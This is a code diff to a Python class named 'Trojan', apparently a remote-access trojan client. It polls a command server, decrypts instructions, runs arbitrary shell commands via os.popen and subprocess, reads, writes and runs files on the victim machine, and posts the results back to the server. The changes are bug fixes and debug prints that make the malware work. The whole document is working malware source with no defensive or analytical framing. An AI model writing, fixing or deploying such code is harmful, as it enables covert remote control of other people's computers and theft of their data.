@@ -16,7 +16,7 @@ class Trojan:
         self.commandurl = commandurl
         self.useragent = useragent
         self.computerid = computerid
-        self.headers = {'computer-id':'DHT-11', 'User-agent' : self.useragent}
+        self.headers = {'computer-id':self.computerid, 'User-agent' : self.useragent}
         self.headers.update(headers) #concatenates two dictionaries
     
     def commands(self) -> dict:
@@ -27,17 +27,18 @@ class Trojan:
         commands = ''
         try:
             commands = json.loads(decryptedresponse)
-        except JSONDecodeError:
+        except json.JSONDecodeError:
             decryptedresponse = decryptedresponse.replace('\'', '"')
             commands = json.loads(decryptedresponse)
         return commands
     
     def sendoutcome(self, outcome: dict) -> str:
-        print('in sendoutcome')
-        data = parse.urlencode(encrypt(outcome)).encode('utf-8')
+        print('sending ', outcome)
+        data = parse.quote(encrypt(outcome)).encode('utf-8')
         req = request.Request(self.commandurl, data=data, headers = self.headers)
         with request.urlopen(req) as response:
             response = response.read().decode()
+        print('sent')
         return response
             
     def run(self):
@@ -50,11 +51,10 @@ class Trojan:
         commands = self.commands()
         print(commands)
         outcomes = {'cmd' : [], 'file-read' : [], 'file-write' : [], 'file-run' : []}
-        print(commands)
         for key, values in commands.items():
             if key.lower() == 'cmd':
                 for cmd in values: #just keeps running seemingly random values
-                    output = os.system('cmd /c "%s"'% cmd) 
+                    output = str(os.popen(cmd).read())
                     if output == -1 or output == 1:
                         try:
                             output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT)
@@ -92,7 +92,10 @@ class Trojan:
                     else:
                         output += '\n\n[*] Invalid file type\n\n'
                     outcomes['file-run'].append([value, output])
+        outcomes = str(outcomes)
+        print('sending...')
         self.sendoutcome(outcomes)
+                    
                     
                     
                     
